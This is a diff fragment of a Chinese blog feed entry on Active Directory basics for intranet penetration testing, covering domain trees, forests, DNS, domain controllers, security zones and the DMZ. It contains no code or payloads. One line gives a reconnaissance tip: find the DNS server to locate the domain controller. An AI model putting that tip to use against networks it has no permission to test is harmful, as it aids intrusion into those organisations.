+<li><p>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p>
+</li>
+<li><p>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</p>
+</li>
+</ul>
+<p>abc.com 是一级域</p>
+<p>asia是二级域</p>
+<p><img src="/posts/44578/1.png" alt></p>
+<h3 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h3><p>域森林指若干个域树通过建立信任关系组成的集合。可以通过域树之间建立的信任关系来管理和使用整个森林中的资源，从而又保持了原有域自身原有的特性。</p>
+<p><img src="/posts/44578/2.png" alt></p>
+<h3 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h3><ul>
+<li>DNS域名服务器是进行域名和与之对应的IP地址转换的服务器。</li>
+<li>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等等。</li>
+<li>一般情况下，我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为<strong>通常DNS服务器和域控制器会处在同一台机器上</strong>。</li>
+</ul>
+<h2 id="0x03-活动目录-AD"><a href="#0x03-活动目录-AD" class="headerlink" title="0x03 活动目录(AD)"></a>0x03 活动目录(AD)</h2><ul>
+<li>活动目录（Active Directory）是域环境中提供目录服务的组件。</li>
+<li>目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</li>
+<li>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</li>
+</ul>
+<p>**<br>逻辑结构**</p>
+<ul>
+<li>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“<strong>逻辑结构</strong>”。</li>
+<li>活动目录的逻辑结构就包括上面讲到的组织单元（OU）、域（domain）、域树（tree）、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</li>
+</ul>
+<p><strong>活动目录的主要功能</strong></p>
+<ol>
+<li>帐号集中管理，所有帐号均存在服务器上，方便对帐号的重命令/重置密码。</li>
+<li>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择安装软件。</li>
+<li>环境集中管理，利用AD可以统一客户端桌面，IE，TCP/IP等设置。</li>
+<li>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</li>
+<li>更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，岩机时间更少。</li>
+<li>活动目录为Microsoft统一管理的基础平台，其它isa，exchange，sms等服务都依赖于这个基础平台。</li>
+</ol>
+<h2 id="0x04-AD和DC的区别"><a href="#0x04-AD和DC的区别" class="headerlink" title="0x04 AD和DC的区别"></a>0x04 AD和DC的区别</h2><ul>
+<li>如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。</li>
+<li>那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</li>
+<li>DC的本质是一台计算机，AD的本质是提供目录服务的组件</li>
+</ul>
+<h2 id="0x05-域相关概念"><a href="#0x05-域相关概念" class="headerlink" title="0x05 域相关概念"></a>0x05 域相关概念</h2><h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p>
+<p><img src="/posts/44578/3.png" alt></p>
+<h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><ul>
+<li>两个防火墙之间的空间被称为DMZ。</li>
+<li>DMZ是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。</li>
+<li>为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</li>
+<li>该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。</li>
+<li>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</li>
+</ul>
+<h2 id="0x06-域中计算机分类"><a href="#0x06-域中计算机分类" class="headerlink" title="0x06 域中计算机分类"></a>0x06 域中计算机分类</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域控制器</span><br><span class="line">成员服务器</span><br><span class="line">客户机</span><br><span class="line">独立服务器</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。</li>
+<li>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。</li>
+</ul>
+<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>今天就先写到这，回头再查点资料，再补充补充。。。</p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+        <tag>域</tag>
       </tags>
   </entry>
   <entry>
